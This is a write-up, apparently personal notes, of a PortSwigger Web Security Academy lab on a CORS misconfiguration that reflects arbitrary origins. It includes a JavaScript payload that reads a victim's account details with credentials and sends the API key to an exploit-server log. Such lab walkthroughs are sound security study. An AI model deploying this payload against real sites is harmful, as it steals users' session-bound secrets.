[Try it yourself before continuing](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

![](./Images/Pasted%20image%2020241208101022.png)

---

![](./Images/Pasted%20image%2020241208101809.png)

Let's start with a pre-flight check
to determine which request origins, methods or headers are allowed

![](./Images/Pasted%20image%2020241208102213.png)
> We have `Method Not Allowed` so the OPTIONS method will not work

![](./Images/Pasted%20image%2020241208102425.png)

These responses indicate that access is allowed from the domain `dipeua-website.com` and that cross-origin requests may include cookies (Access-Control-Allow-Credentials: true) and will therefore be processed in session.

> Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources in the vulnerable domain.

Since our response contains sensitive information such as an API key we can retrieve it with the following script:

```js
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://0aad00bf048b7e8d80073f9b007300d8.web-security-academy.net/accountDetails',true);
	req.withCredentials = true;
	req.send();

	function reqListener() {
		location='https://exploit-0a8700ca04567e5780bf3ea801e5003e.exploit-server.net//log?key='+this.responseText;
	};
</script>
```

And send to the victim `Deliver exploit to victim`

![](./Images/Pasted%20image%2020241208102824.png)

Looking in the logs we did recover the information from the administrator

![](./Images/Pasted%20image%2020241208102914.png)
![](./Images/Pasted%20image%2020241208103139.png)

Then submit **api key** to validate the challenge
